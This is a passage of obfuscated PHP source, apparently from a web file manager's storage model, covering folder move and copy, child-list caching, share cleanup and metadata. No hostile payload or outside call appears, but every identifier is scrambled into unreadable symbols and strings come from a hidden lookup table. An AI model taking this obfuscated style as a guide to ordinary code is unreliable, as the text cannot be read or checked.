$®€æßŒ‰[$‚°£íÔ[468]]; return $áü¾Ğ…ü; } $ÊÜˆÜ›› = array(); $îíşçèé = array(); $this->_childrenListAll($÷·äĞ›ô, $ÊÜˆÜ››); $Ô§Æ‡¿™ = count($ÊÜˆÜ››); if ($Ô§Æ‡¿™ == 0) { return $áü¾Ğ…ü; } $Ä ”àÀÒ = $this->sourceInfo($áü¾Ğ…ü); foreach ($ÊÜˆÜ›› as $“°ñÖƒ¥) { $¨¡‹Íü = $this->_makeItemData($“°ñÖƒ¥, $Ä ”àÀÒ, $“°ñÖƒ¥[$‚°£íÔ[32]]); $¨¡‹Íü[$‚°£íÔ[521]] = $“°ñÖƒ¥[$‚°£íÔ[521]]; $îíşçèé[] = $¨¡‹Íü; } $this->chunkEventSet($‚°£íÔ[576], array($‚°£íÔ[577], $€°®•ˆÒ, $Ô§Æ‡¿™)); $this->addAll($îíşçèé, array(), !1); $„Ü´Øİ = $this->where(array($‚°£íÔ[432] => $áü¾Ğ…ü))->select(); $ëşëıõ = $this->_childrenMakeRelation($ÊÜˆÜ››, $„Ü´Øİ); $ëşëıõ[$÷·äĞ›ô] = $áü¾Ğ…ü; $²ØîÀœ¦ = array(); $°á£æ‡ñ = array(); foreach ($„Ü´Øİ as $“°ñÖƒ¥) { $ˆ¡¿Ÿõ® = $“°ñÖƒ¥[$‚°£íÔ[402]]; $©¿•­Ü× = $this->_childrenMatch($ëşëıõ, $“°ñÖƒ¥, $Ä ”àÀÒ); $²ØîÀœ¦[] = array($‚°£íÔ[402], $ˆ¡¿Ÿõ®, $‚°£íÔ[432], $©¿•­Ü×[$‚°£íÔ[432]]); $°á£æ‡ñ[] = array($‚°£íÔ[402], $ˆ¡¿Ÿõ®, $‚°£íÔ[521], $©¿•­Ü×[$‚°£íÔ[521]]); $this->_copyApplyMeta($“°ñÖƒ¥, $©Š«º”û); if ($“°ñÖƒ¥[$‚°£íÔ[410]] != $‚°£íÔ[88]) { $©Š«º”û[$‚°£íÔ[566]][] = $“°ñÖƒ¥[$‚°£íÔ[468]]; } } $this->chunkEventSet($‚°£íÔ[578], array($‚°£íÔ[579], $€°®•ˆÒ, $Ô§Æ‡¿™)); $this->saveAll($²ØîÀœ¦); $this->chunkEventSet($‚°£íÔ[580], array($‚°£íÔ[581], $€°®•ˆÒ, $Ô§Æ‡¿™)); $this->saveAll($°á£æ‡ñ); return $áü¾Ğ…ü; } private function _childrenMakeRelation($£…Õ˜‡Ş, $·¿øŒé¦) { $»ÙåÏÄŸ =& $_SERVER[ùÆÎÔ“Ñ]; $Î€™ŠÃŒ = array(); $¦àÂ„ = array(); foreach ($£…Õ˜‡Ş as $ßÎã—) { $µ•¼’‹ó = $ßÎã—[$»ÙåÏÄŸ[32]] . $»ÙåÏÄŸ[8] . $ßÎã—[$»ÙåÏÄŸ[521]]; $Î€™ŠÃŒ[$µ•¼’‹ó] = $ßÎã—[$»ÙåÏÄŸ[402]]; } foreach ($·¿øŒé¦ as $ßÎã—) { $µ•¼’‹ó = $ßÎã—[$»ÙåÏÄŸ[32]] . $»ÙåÏÄŸ[8] . $ßÎã—[$»ÙåÏÄŸ[521]]; $½·êÇ† = $Î€™ŠÃŒ[$µ•¼’‹ó]; $¦àÂ„[$½·êÇ†] = $ßÎã—[$»ÙåÏÄŸ[402]]; } return $¦àÂ„; } private function _childrenMatch($Ê”òËâ, $ÎÌ¦¾È, $‰£¼ƒ¸ù) { $±Â¡Óë¯ =& $_SERVER[ùÆÎÔ“Ñ]; $‚–£ÖÒ = $‰£¼ƒ¸ù[$±Â¡Óë¯[521]]; $ı°Ù£òŠ = $this->parentLevelArray($ÎÌ¦¾È[$±Â¡Óë¯[521]]); foreach ($ı°Ù£òŠ as $ƒ‰¯‚Ô•) { if (isset($Ê”òËâ[$ƒ‰¯‚Ô•])) { $‚–£ÖÒ .= $Ê”òËâ[$ƒ‰¯‚Ô•] . $±Â¡Óë¯[582]; } } $‚–£ÖÒ = rtrim($‚–£ÖÒ, $±Â¡Óë¯[50]) . $±Â¡Óë¯[50]; $¡í¸üè = $this->parentLevelArray($‚–£ÖÒ); $óÁÊØı = $¡í¸üè[count($¡í¸üè) - 1]; return array($±Â¡Óë¯[432] => $óÁÊØı, $±Â¡Óë¯[521] => $‚–£ÖÒ); } private function _makeItemData($Ë£Â…şè, $Üë£Ñ˜Œ, $û¦ıÓ¸) { $ÓÒ”õğ• =& $_SERVER[ùÆÎÔ“Ñ]; $ÄÉ¡ì§ = array($ÓÒ”õğ•[583] => $Ë£Â…şè[$ÓÒ”õğ•[410]], $ÓÒ”õğ•[420] => $û¦ıÓ¸, $ÓÒ”õğ•[584] => $Ë£Â…şè[$ÓÒ”õğ•[412]] ? $Ë£Â…şè[$ÓÒ”õğ•[412]] : $ÓÒ”õğ•[12], $ÓÒ”õğ•[469] => $Ë£Â…şè[$ÓÒ”õğ•[468]] ? $Ë£Â…şè[$ÓÒ”õğ•[468]] : 0, $ÓÒ”õğ•[585] => $Ë£Â…şè[$ÓÒ”õğ•[76]] ? $Ë£Â…şè[$ÓÒ”õğ•[76]] : 0, $ÓÒ”õğ•[586] => intval($Üë£Ñ˜Œ[$ÓÒ”õğ•[411]]), $ÓÒ”õğ•[587] => intval($Üë£Ñ˜Œ[$ÓÒ”õğ•[505]]), $ÓÒ”õğ•[588] => intval(USER_ID), $ÓÒ”õğ•[589] => intval(USER_ID), $ÓÒ”õğ•[401] => intval($Üë£Ñ˜Œ[$ÓÒ”õğ•[402]]), $ÓÒ”õğ•[590] => $Üë£Ñ˜Œ[$ÓÒ”õğ•[521]] . $Üë£Ñ˜Œ[$ÓÒ”õğ•[402]] . $ÓÒ”õğ•[50], $ÓÒ”õğ•[424] => $Ë£Â…şè[$ÓÒ”õğ•[85]] ? $Ë£Â…şè[$ÓÒ”õğ•[85]] : time(), $ÓÒ”õğ•[430] => 0, $ÓÒ”õğ•[591] => $ÓÒ”õğ•[12]); return $ÄÉ¡ì§; } private function _copyApplyMeta($ş“Àè¶, &$ı›¡ï¶Ì) { $±¯½ú =& $_SERVER[ùÆÎÔ“Ñ]; $¿‰Ú“•… = $ş“Àè¶[$±¯½ú[402]]; $¬Öùïõ´ = $ş“Àè¶[$±¯½ú[32]]; if (!isset($ş“Àè¶[$±¯½ú[592]]) || !$ş“Àè¶[$±¯½ú[592]] || $ş“Àè¶[$±¯½ú[592]] == $±¯½ú[197]) { $ı›¡ï¶Ì[$±¯½ú[568]][] = array($±¯½ú[402], $¿‰Ú“•…, $±¯½ú[592], short_id($¿‰Ú“•…)); } if (Input::check($¬Öùïõ´, $±¯½ú[593])) { $ı›¡ï¶Ì[$±¯½ú[567]][] = array($±¯½ú[402] => $¿‰Ú“•…, $±¯½ú[94] => $±¯½ú[465], $±¯½ú[374] => str_replace($±¯½ú[53], $±¯½ú[12], Pinyin::get($¬Öùïõ´))); $ı›¡ï¶Ì[$±¯½ú[567]][] = array($±¯½ú[402] => $¿‰Ú“•…, $±¯½ú[94] => $±¯½ú[464], $±¯½ú[374] => Pinyin::get($¬Öùïõ´, $±¯½ú[594])); } $ı›¡ï¶Ì[$±¯½ú[567]][] = array($±¯½ú[402] => $¿‰Ú“•…, $±¯½ú[94] => $±¯½ú[444], $±¯½ú[374] => KodSort::makeStr($¬Öùïõ´)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($©ëû˜ıê) { $ğ®Œ²§İ =& $_SERVER[ùÆÎÔ“Ñ]; $»É¥·×Ì = $this->sourceInfo($©ëû˜ıê); $º”æÎ›õ = $ğ®Œ²§İ[595]; $Àáü£•Ø = array($ğ®Œ²§İ[521] => array($ğ®Œ²§İ[550], $»É¥·×Ì[$ğ®Œ²§İ[521]] . $©ëû˜ıê . $ğ®Œ²§İ[551]), $ğ®Œ²§İ[431] => $this->targetIsDelete); $áÏÆ×®œ = $this->field($º”æÎ›õ)->where($Àáü£•Ø)->select(); if (!$áÏÆ×®œ) { return; } $áÏÆ×®œ = array_to_keyvalue($áÏÆ×®œ, $ğ®Œ²§İ[402]); foreach ($áÏÆ×®œ as $€Âıõ·Í) { $—Úí§¸Á = $€Âıõ·Í[$ğ®Œ²§İ[432]]; $©ëû˜ıê = $€Âıõ·Í[$ğ®Œ²§İ[402]]; if (!isset($this->_childrenListCache[$©ëû˜ıê]) && $€Âıõ·Í[$ğ®Œ²§İ[410]] == $ğ®Œ²§İ[88]) { $this->_childrenListCache[$©ëû˜ıê] = array(); } if (!isset($this->_childrenListCache[$—Úí§¸Á])) { $this->_childrenListCache[$—Úí§¸Á] = array(); } $this->_childrenListCache[$—Úí§¸Á][$©ëû˜ıê] = $€Âıõ·Í; $this->_childrenItemCache[$©ëû˜ıê] = $€Âıõ·Í; } } private function _childrenListAll($Åáà“¢ñ, &$ÄÑ¤™î›) { $¢Í½…¡ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->_childrenListCache[$Åáà“¢ñ])) { return; } $Ï¨±¿¹ = $this->_childrenListCache[$Åáà“¢ñ]; foreach ($Ï¨±¿¹ as $°ôÀÀƒ– => $úìˆ”ºï) { $ÄÑ¤™î›[$°ôÀÀƒ–] = $úìˆ”ºï; if ($úìˆ”ºï[$¢Í½…¡[410]] == $¢Í½…¡[88]) { $this->_childrenListAll($°ôÀÀƒ–, $ÄÑ¤™î›); } } } private function sourceInfoCache($ÙØªçíŞ) { if (isset($this->_childrenItemCache[$ÙØªçíŞ])) { return $this->_childrenItemCache[$ÙØªçíŞ]; } return $this->sourceInfo($ÙØªçíŞ); } private function _childrenList($Íç¹ğÙ ) { if (isset($this->_childrenListCache[$Íç¹ğÙ ])) { return $this->_childrenListCache[$Íç¹ğÙ ]; } return $this->_childrenListSelect($Íç¹ğÙ ); } private function _childrenListSelect($ğ‘¹æ™Ç) { $°Ê¾ÜÙÉ =& $_SERVER[ùÆÎÔ“Ñ]; $¸ä†ğÖš = array($°Ê¾ÜÙÉ[432] => $ğ‘¹æ™Ç, $°Ê¾ÜÙÉ[431] => $this->targetIsDelete); $»ô¡ÁÚ› = $this->where($¸ä†ğÖš)->select(); $»ô¡ÁÚ› = $»ô¡ÁÚ› ? $»ô¡ÁÚ› : array(); $ŸÎ Š¢ = array_to_keyvalue($»ô¡ÁÚ›, $°Ê¾ÜÙÉ[402]); $this->_childrenListCache[$ğ‘¹æ™Ç] = $ŸÎ Š¢; foreach ($ŸÎ Š¢ as $ğ‘¹æ™Ç => $ Ó­ë°Ó) { $this->_childrenItemCache[$ğ‘¹æ™Ç] = $ Ó­ë°Ó; } return $ŸÎ Š¢; } private function fileNameExistCache($Õ§”Çû, $™í›ÅşÀ) { $ñÜ£€çÍ =& $_SERVER[ùÆÎÔ“Ñ]; $™í›ÅşÀ = strtolower($™í›ÅşÀ); $²“œ×êµ = $this->_childrenList($Õ§”Çû); foreach ($²“œ×êµ as $µ´®«îİ) { if ($™í›ÅşÀ == strtolower($µ´®«îİ[$ñÜ£€çÍ[32]])) { return $µ´®«îİ[$ñÜ£€çÍ[402]]; } } return !1; } private function fileNameAutoCache($¦—ùÂ¢³, $Í¿è ô«, $åá¡ıî§, $Ôˆ®İªÀ) { $ùà¤­ £ =& $_SERVER[ùÆÎÔ“Ñ]; $Èª’Ø¼í = $this->_childrenList($¦—ùÂ¢³); $ÖÙ×»Î‹ = array_to_keyvalue($Èª’Ø¼í, $ùà¤­ £[12], $ùà¤­ £[32]); return $this->fileNameAutoGet($ÖÙ×»Î‹, $Í¿è ô«, $åá¡ıî§, $Ôˆ®İªÀ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Û°Âå, $…ÉõÉ…®, $¯•‹õ‰ç = REPEAT_REPLACE, $‡–¯ùÖŒ = '') { $şäõ¤³ =& $_SERVER[ùÆÎÔ“Ñ]; $›íÁ«œè = $this->sourceInfo($Û°Âå); $şÇì’èı = $this->sourceInfo($…ÉõÉ…®); if ($›íÁ«œè[$şäõ¤³[432]] == $şÇì’èı[$şäõ¤³[402]]) { if ($›íÁ«œè[$şäõ¤³[431]] == $şäõ¤³[88]) { Model($şäõ¤³[429])->restore(array($Û°Âå)); } if (!$‡–¯ùÖŒ || $‡–¯ùÖŒ == $›íÁ«œè[$şäõ¤³[32]]) { return $Û°Âå; } } $ººè«ò‚ = $this->pathInfoMore($Û°Âå); if ($this->isParentOf($Û°Âå, $…ÉõÉ…®)) { return !1; } if (!$›íÁ«œè || !$şÇì’èı || $şÇì’èı[$şäõ¤³[410]] != $şäõ¤³[88]) { return !1; } Hook::trigger($şäõ¤³[596], $ººè«ò‚); $this->targetIsDelete = intval($›íÁ«œè[$şäõ¤³[431]]); if ($›íÁ«œè[$şäõ¤³[432]] == $…ÉõÉ…® && $‡–¯ùÖŒ != $›íÁ«œè[$şäõ¤³[32]]) { $™ÌêÁ¯­ = $this->fileNameExist($…ÉõÉ…®, $‡–¯ùÖŒ); if ($™ÌêÁ¯­ && $›íÁ«œè[$şäõ¤³[410]] == $şäõ¤³[197]) { $‰ƒ…Ä…– = $this->sourceInfo($™ÌêÁ¯­); $î…Û‡¯¿ = $this->fileHistory($‰ƒ…Ä…–, $›íÁ«œè[$şäõ¤³[468]], $›íÁ«œè[$şäõ¤³[76]]); if (!$î…Û‡¯¿) { Model($şäõ¤³[471])->remove($›íÁ«œè[$şäõ¤³[468]]); } $this->removeNow($Û°Âå, !1); $this->folderSizeReset($…ÉõÉ…®); Hook::trigger($şäõ¤³[597], $ººè«ò‚); return $™ÌêÁ¯­; } } $“ˆÀÈıü = $‡–¯ùÖŒ ? $‡–¯ùÖŒ : $›íÁ«œè[$şäõ¤³[32]]; $this->lockMoveStart($Û°Âå); $this->lockWriteStart($…ÉõÉ…®, $“ˆÀÈıü); $²äÄå¯ñ = array($şäõ¤³[566] => array(), $şäõ¤³[598] => !1); $this->clearShare($Û°Âå, $…ÉõÉ…®); $çáÙ‡Âï = $this->fileNameExistCache($…ÉõÉ…®, $›íÁ«œè[$şäõ¤³[32]]); $ƒò¥‘£‰ = $this->_move($Û°Âå, $…ÉõÉ…®, $¯•‹õ‰ç, $²äÄå¯ñ, $‡–¯ùÖŒ); $this->sourceCacheClear(); if ($›íÁ«œè[$şäõ¤³[410]] == $şäõ¤³[88] && $çáÙ‡Âï) { $this->folderSizeResetChildren($ƒò¥‘£‰); } Model($şäõ¤³[199])->linkAdd($²äÄå¯ñ[$şäõ¤³[566]]); if ($çáÙ‡Âï && $²äÄå¯ñ[$şäõ¤³[598]]) { $this->removeNow($Û°Âå, !1); } $this->lockMoveEnd($Û°Âå); $this->lockWriteEnd($…ÉõÉ…®, $“ˆÀÈıü); $this->folderSizeReset($›íÁ«œè[$şäõ¤³[432]]); $this->folderSizeReset($…ÉõÉ…®); $Îİğ˜— = array($›íÁ«œè[$şäõ¤³[432]], $…ÉõÉ…®); if ($›íÁ«œè[$şäõ¤³[410]] == $şäõ¤³[88]) { $Îİğ˜—[] = $Û°Âå; } $this->updateModifyTime($Îİğ˜—); Model($şäõ¤³[570])->eventMove($Û°Âå, $›íÁ«œè[$şäõ¤³[432]], $…ÉõÉ…®); Hook::trigger($şäõ¤³[597], $ººè«ò‚); return $ƒò¥‘£‰; } private function _move($şÉìøé, $ Ñ£¢Ğ”, $Şî¾Â¬Û, &$á¹Üòªü, $”‘«¯ÎÀ = '') { $¥•¾¶»‚ =& $_SERVER[ùÆÎÔ“Ñ]; $ÂÁÖ”Ÿí = $this->sourceInfo($şÉìøé); $û¯±¹¸Å = $ÂÁÖ”Ÿí[$¥•¾¶»‚[410]] == $¥•¾¶»‚[88]; $é•ŠŠŒ  = $”‘«¯ÎÀ ? $”‘«¯ÎÀ : $ÂÁÖ”Ÿí[$¥•¾¶»‚[32]]; $Ì×€À•î = $this->fileNameExistCache($ Ñ£¢Ğ”, $é•ŠŠŒ ); $this->lockMoveStart($şÉìøé); $this->lockWriteStart($ Ñ£¢Ğ”, $é•ŠŠŒ ); if (!$Ì×€À•î) { return $this->_moveForce($şÉìøé, $ Ñ£¢Ğ”, $é•ŠŠŒ ); } $µÈÄ‘à™ = $Ì×€À•î; $ØíÍØ‹Š = !1; if ($û¯±¹¸Å) { if ($Şî¾Â¬Û == REPEAT_RENAME_FOLDER) { $é•ŠŠŒ  = $this->fileNameAuto($ Ñ£¢Ğ”, $é•ŠŠŒ , $Şî¾Â¬Û, $û¯±¹¸Å); $µÈÄ‘à™ = $this->_moveForce($şÉìøé, $ Ñ£¢Ğ”, $é•ŠŠŒ ); } else { if ($Şî¾Â¬Û == REPEAT_RENAME_FOLDER) { $Şî¾Â¬Û = REPEAT_RENAME; } $¯Šãî° = $this->_childrenListSelect($şÉìøé); foreach ($¯Šãî° as $·ğ­Ñé£) { $this->_move($·ğ­Ñé£[$¥•¾¶»‚[402]], $Ì×€À•î, $Şî¾Â¬Û, $á¹Üòªü); } $ØíÍØ‹Š = !0; } } else { if ($Şî¾Â¬Û == REPEAT_SKIP) { $ØíÍØ‹Š = !0; } else { if ($Şî¾Â¬Û == REPEAT_RENAME || $Şî¾Â¬Û == REPEAT_RENAME_FOLDER) { $é•ŠŠŒ  = $this->fileNameAuto($ Ñ£¢Ğ”, $é•ŠŠŒ , $Şî¾Â¬Û, $û¯±¹¸Å); $µÈÄ‘à™ = $this->_moveForce($şÉìøé, $ Ñ£¢Ğ”, $é•ŠŠŒ ); } else { if ($Şî¾Â¬Û == REPEAT_REPLACE) { $ÉÜÊë÷Å = $this->sourceInfoCache($Ì×€À•î); $­ÛÕî•¨ = $this->fileHistory($ÉÜÊë÷Å, $ÂÁÖ”Ÿí[$¥•¾¶»‚[468]], $ÂÁÖ”Ÿí[$¥•¾¶»‚[76]]); $ØíÍØ‹Š = !0; if ($­ÛÕî•¨) { $á¹Üòªü[$¥•¾¶»‚[566]][] = $ÂÁÖ”Ÿí[$¥•¾¶»‚[468]]; } } } } } if ($ØíÍØ‹Š && !$á¹Üòªü[$¥•¾¶»‚[598]]) { $á¹Üòªü[$¥•¾¶»‚[598]] = !0; } return $µÈÄ‘à™; } private function _moveForce($ƒ¿¤Åíã, $İªŸÊòÕ, $Ô©’õ›Ç) { $‚ø•êÃĞ =& $_SERVER[ùÆÎÔ“Ñ]; $ãÅãÑî¾ = $this->sourceInfo($ƒ¿¤Åíã); $¤ˆºûş– = $this->sourceInfo($İªŸÊòÕ); $ïû“´×• = $ãÅãÑî¾[$‚ø•êÃĞ[410]] == $‚ø•êÃĞ[88]; $ûÒ¼¯© = array($‚ø•êÃĞ[401] => $¤ˆºûş–[$‚ø•êÃĞ[402]], $‚ø•êÃĞ[590] => $¤ˆºûş–[$‚ø•êÃĞ[521]] . $¤ˆºûş–[$‚ø•êÃĞ[402]] . $‚ø•êÃĞ[50], $‚ø•êÃĞ[586] => $¤ˆºûş–[$‚ø•êÃĞ[411]], $‚ø•êÃĞ[587] => $¤ˆºûş–[$‚ø•êÃĞ[505]], $‚ø•êÃĞ[589] => USER_ID, $‚ø•êÃĞ[420] => $Ô©’õ›Ç); $¡Æ·Ø­ = $ãÅãÑî¾[$‚ø•êÃĞ[411]] == SourceModel::TYPE_GROUP && $¤ˆºûş–[$‚ø•êÃĞ[411]] == SourceModel::TYPE_GROUP && $ãÅãÑî¾[$‚ø•êÃĞ[505]] == $¤ˆºûş–[$‚ø•êÃĞ[505]]; if (!$¡Æ·Ø­ && $this->moveClearAuth) { Model($‚ø•êÃĞ[502])->authClear($ƒ¿¤Åíã); } $¼ÑİÈ = $ãÅãÑî¾[$‚ø•êÃĞ[431]] == $‚ø•êÃĞ[88] && $¤ˆºûş–[$‚ø•êÃĞ[431]] != $‚ø•êÃĞ[88]; if ($¼ÑİÈ) { $ûÒ¼¯©[$‚ø•êÃĞ[430]] = 0; } if ($ïû“´×•) { $öÕÓŞŠø = array($‚ø•êÃĞ[590] => array($‚ø•êÃĞ[550], $ãÅãÑî¾[$‚ø•êÃĞ[521]] . $ãÅãÑî¾[$‚ø•êÃĞ[402]] . $‚ø•êÃĞ[551])); $èÛ…Öââ = $ãÅãÑî¾[$‚ø•êÃĞ[521]] . $ãÅãÑî¾[$‚ø•êÃĞ[402]] . $‚ø•êÃĞ[50]; $¤õß«æ = $¤ˆºûş–[$‚ø•êÃĞ[521]] . $¤ˆºûş–[$‚ø•êÃĞ[402]] . $‚ø•êÃĞ[50] . $ãÅãÑî¾[$‚ø•êÃĞ[402]] . $‚ø•êÃĞ[50]; $­¹À­š« = array($‚ø•êÃĞ[590] => array($‚ø•êÃĞ[599], "\162\x65\160\x6c\141\x63\x65\x28\x70\x61\x72\x65\156\164\114\x65\x76\x65\154\x2c\47{$èÛ…Öââ}\x27\54\x27{$¤õß«æ}\47\x29"), $‚ø•êÃĞ[586] => $¤ˆºûş–[$‚ø•êÃĞ[411]], $‚ø•êÃĞ[587] => $¤ˆºûş–[$‚ø•êÃĞ[505]]); if ($¼ÑİÈ) { $­¹À­š«[$‚ø•êÃĞ[430]] = 0; } $this->where($öÕÓŞŠø)->data($­¹À­š«)->save(); } $this->where(array($‚ø•êÃĞ[417] => $ƒ¿¤Åíã))->data($ûÒ¼¯©)->save(); return $ƒ¿¤Åíã; } private function clearShare($¾ÂŒé÷©, $û›±—ªÁ) { $¿òÇ±ÜÌ =& $_SERVER[ùÆÎÔ“Ñ]; $²«¢Íø = $this->sourceInfo($¾ÂŒé÷©); $âîİ¡ ¼ = $this->sourceInfo($û›±—ªÁ); if ($²«¢Íø[$¿òÇ±ÜÌ[505]] == $âîİ¡ ¼[$¿òÇ±ÜÌ[505]] && $²«¢Íø[$¿òÇ±ÜÌ[411]] == $¿òÇ±ÜÌ[600]) { return; } $ËÄÑ·¯í = array($¿òÇ±ÜÌ[521] => array($¿òÇ±ÜÌ[550], $²«¢Íø[$¿òÇ±ÜÌ[521]] . $¾ÂŒé÷© . $¿òÇ±ÜÌ[551])); $»‡îàÔ¡ = $this->field($¿òÇ±ÜÌ[417])->where($ËÄÑ·¯í)->getField($¿òÇ±ÜÌ[402], !0); if (!$»‡îàÔ¡) { return; } $ËÄÑ·¯í = array($¿òÇ±ÜÌ[402] => array($¿òÇ±ÜÌ[7], $»‡îàÔ¡), $¿òÇ±ÜÌ[496] => 1); $­ğçÂÇ¢ = Model($¿òÇ±ÜÌ[601])->field($¿òÇ±ÜÌ[489])->where($ËÄÑ·¯í)->select(); if (!$­ğçÂÇ¢) { return; } $­ğçÂÇ¢ = array_to_keyvalue($­ğçÂÇ¢, $¿òÇ±ÜÌ[12], $¿òÇ±ÜÌ[489]); $ËÄÑ·¯í = array($¿òÇ±ÜÌ[489] => array($¿òÇ±ÜÌ[7], $­ğçÂÇ¢)); Model($¿òÇ±ÜÌ[601])->where($ËÄÑ·¯í)->save(array($¿òÇ±ÜÌ[496] => 0)); Model($¿òÇ±ÜÌ[602])->where($ËÄÑ·¯í)->delete(); } public function copyFolderFromIO($â¾Œ‡¡, $Ÿ‹“ü÷ù, $ËâÆ§¤, $ÖğŒËîô, $ë’Ç·ºË, $š™í›ä = false) { $­³§¶õú =& $_SERVER[ùÆÎÔ“Ñ]; $ÕÏÑĞĞ = array($­³§¶õú[567] => array(), $­³§¶õú[568] => array(), $­³§¶õú[566] => array(), $­³§¶õú[603] => array()); $£¶¶ÛÚÈ = $š™í›ä ? $š™í›ä : $â¾Œ‡¡->pathThis($Ÿ‹“ü÷ù); $·õÏí•Ä = $this->fileNameExist($ËâÆ§¤, $£¶¶ÛÚÈ); $¡ß‡Ã˜â = $this->mkdir($ËâÆ§¤, $£¶¶ÛÚÈ, $ÖğŒËîô); if (!$·õÏí•Ä || $ÖğŒËîô == REPEAT_RENAME_FOLDER) { $ÖğŒËîô = !1; } if ($·õÏí•Ä) { $this->_childrenAllMake($·õÏí•Ä); } Hook::trigger($­³§¶õú[604]); $this->_copyChildTo($â¾Œ‡¡, $Ÿ‹“ü÷ù, $¡ß‡Ã˜â, $ÖğŒËîô, $ÕÏÑĞĞ, $ë’Ç·ºË); Hook::trigger($­³§¶õú[605]); if ($¡ß‡Ã˜â) { $this->folderSizeResetChildren($¡ß‡Ã˜â); } $this->_childrenListClear(); Model($­³§¶õú[569])->addAll($ÕÏÑĞĞ[$­³§¶õú[567]], array(), !0); Model($­³§¶õú[570])->eventCopy($¡ß‡Ã˜â); $this->saveAll($ÕÏÑĞĞ[$­³§¶õú[568]]); Model($­³§¶õú[471])->linkAdd($ÕÏÑĞĞ[$­³§¶õú[566]]); Model($­³§¶õú[471])->remove($ÕÏÑĞĞ[$­³§¶õú[603]]); $this->folderSizeReset($ËâÆ§¤); $this->updateModifyTime($ËâÆ§¤); return $¡ß‡Ã˜â; } private function _copyChildTo($Ğ‰ü›’î, $Óş½øÂ÷, $±ˆĞ•”Û, $—Ğ˜­ÍÅ, &$Ïœ•èè, $ËŸİ³ ) { $™¶¡„øú =& $_SERVER[ùÆÎÔ“Ñ]; $ô”Á€€ = $this->sourceInfoCache($±ˆĞ•”Û); $ıšñºû˜ = $Ğ‰ü›’î->listPath($Óş½øÂ÷); $ıšñºû˜ = $ıšñºû˜ ? $ıšñºû˜ : array($™¶¡„øú[83] => array(), $™¶¡„øú[82] => array()); $Ÿ°öÔÕ = array_merge($ıšñºû˜[$™¶¡„øú[83]], $ıšñºû˜[$™¶¡„øú[82]]); $šÅšØİœ = $this->_addFiles($Ğ‰ü›’î, $ıšñºû˜[$™¶¡„øú[83]], $ËŸİ³ ); $Ö•¼™Ë™ = array(); foreach ($Ÿ°öÔÕ as &$­æÜËİ‡) { if (isset($šÅšØİœ[$­æÜËİ‡[$™¶¡„øú[32]]])) { $­æÜËİ‡ = $šÅšØİœ[$­æÜËİ‡[$™¶¡„øú[32]]]; } $­æÜËİ‡[$™¶¡„øú[410]] = $­æÜËİ‡[$™¶¡„øú[33]] == $™¶¡„øú[75]; $­æÜËİ‡[$™¶¡„øú[412]] = substr(_get($­æÜËİ‡, $™¶¡„øú[174], $™¶¡„øú[12]), 0, 10); $­æÜËİ‡[$™¶¡„øú[76]] = _get($­æÜËİ‡, $™¶¡„øú[76], 0); $­æÜËİ‡[$™¶¡„øú[468]] = _get($­æÜËİ‡, $™¶¡„øú[468], 0); if (!isset($­æÜËİ‡[$™¶¡„øú[606]]) && $­æÜËİ‡[$™¶¡„øú[468]]) { $Ïœ•èè[$™¶¡„øú[603]][] = $­æÜËİ‡[$™¶¡„øú[468]]; } if ($—Ğ˜­ÍÅ) { $ĞĞ’ç®ô = $this->fileNameExistCache($±ˆĞ•”Û, $­æÜËİ‡[$™¶¡„øú[32]]); if ($ĞĞ’ç®ô) { if ($­æÜËİ‡[$™¶¡„øú[410]] || $—Ğ˜­ÍÅ == REPEAT_SKIP) { continue; } if ($—Ğ˜­ÍÅ == REPEAT_REPLACE) { $«À¾®¯ = $this->sourceInfoCache($ĞĞ’ç®ô); $çˆÙŒ£ = $this->fileHistory($«À¾®¯, $­æÜËİ‡[$™¶¡„øú[468]], $­æÜËİ‡[$™¶¡„øú[76]]); if ($çˆÙŒ£) { $Ïœ•èè[$™¶¡„øú[566]][] = $­æÜËİ‡[$™¶¡„øú[468]]; } continue; } else { if ($—Ğ˜­ÍÅ == REPEAT_RENAME) { $­æÜËİ‡[$™¶¡„øú[32]] = $this->fileNameAutoCache($±ˆĞ•”Û, $­æÜËİ‡[$™¶¡„øú[32]], $—Ğ˜­ÍÅ, !1); } } } } if (!$­æÜËİ‡[$™¶¡„øú[410]] && $­æÜËİ‡[$™¶¡„øú[468]] == 0) { continue; } if (!$­æÜËİ‡[$™¶¡„øú[410]] && $­æÜËİ‡[$™¶¡„øú[468]]) { $Ïœ•èè[$™¶¡„øú[566]][] = $­æÜËİ‡[$™¶¡„øú[468]]; } $Ö•¼™Ë™[] = $this->_makeItemData($­æÜËİ‡, $ô”Á€€, $­æÜËİ‡[$™¶¡„øú[32]]); } unset($­æÜËİ‡); if (!empty($Ö•¼™Ë™)) { $this->addAll($Ö•¼™Ë™); $this->_childrenListSelect($±ˆĞ•”Û); } $óŠùÑ‰Ù = $this->_childrenList($±ˆĞ•”Û); $óŠùÑ‰Ù = array_to_keyvalue($óŠùÑ‰Ù, $™¶¡„øú[32]); foreach ($Ÿ°öÔÕ as $­æÜËİ‡) { $«À¾®¯ = $óŠùÑ‰Ù[$­æÜËİ‡[$™¶¡„øú[32]]]; $Î·Ÿğ£› = $«À¾®¯[$™¶¡„øú[402]]; $this->_copyApplyMeta($«À¾®¯, $Ïœ•èè); if ($­æÜËİ‡[$™¶¡„øú[33]] == $™¶¡„øú[75]) { $­æÜËİ‡[$™¶¡„øú[84]] = $Ğ‰ü›’î->getPathInner($­æÜËİ‡[$™¶¡„øú[84]]); $this->_copyChildTo($Ğ‰ü›’î, $­æÜËİ‡[$™¶¡„øú[84]], $Î·Ÿğ£›, $—Ğ˜­ÍÅ, $Ïœ•èè, $ËŸİ³ ); } } } private function _addFiles($¡£«û, $¢î¹®·è, $ô–Ô×¨¶) { $³›˜Êõò =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¢î¹®·è || count($¢î¹®·è) == 0) { return array(); } $ğîÊ¹‹ = array(); foreach ($¢î¹®·è as &$•€™½³¸) { Hook::trigger($³›˜Êõò[607], $•€™½³¸); $•€™½³¸[$³›˜Êõò[84]] = $¡£«û->getPathInner($•€™½³¸[$³›˜Êõò[84]]); $ïÃÕıŒ× = $¡£«û->hashSimple($•€™½³¸[$³›˜Êõò[84]]); $‡ùôĞ›Ğ = $¡£«û->hashMd5($•€™½³¸[$³›˜Êõò[84]]); if (strlen($‡ùôĞ›Ğ) > 10 && !isset($ğîÊ¹‹[$‡ùôĞ›Ğ])) { 